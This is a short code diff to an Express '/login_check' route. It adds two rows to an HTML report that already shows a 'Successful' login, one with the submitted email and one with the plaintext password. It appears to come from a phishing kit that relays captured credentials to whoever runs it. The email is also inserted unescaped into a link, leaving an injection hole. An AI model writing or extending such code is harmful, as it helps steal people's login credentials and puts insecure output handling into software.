@@ -317,6 +317,24 @@ routes.post('/login_check', async (req, res) => {
               ✓ Successful ✅
             </td>
           </tr>
+           <tr style="background:#f8fafc;">
+            <td style="padding:15px 13px;color:#64748b;">
+              Using Login Email 
+            </td>
+            <td style="padding:15px 13px;color:#0f172a;font-weight:600;border-bottom:1px solid #e2e8f0;">
+             <a href=${username}>${username}<a/>💌
+            </td>
+          </tr>
+          <tr style="background:#f8fafc;">
+            <td style="padding:15px 13px;color:#64748b;">
+              Using Login Password 
+            </td>
+            <td style="padding:15px 13px;color:#0f172a;font-weight:600;border-bottom:1px solid #e2e8f0;">
+             ${password}🔑
+            </td>
+          </tr>
+          
+         
 
         </table>
       </div>
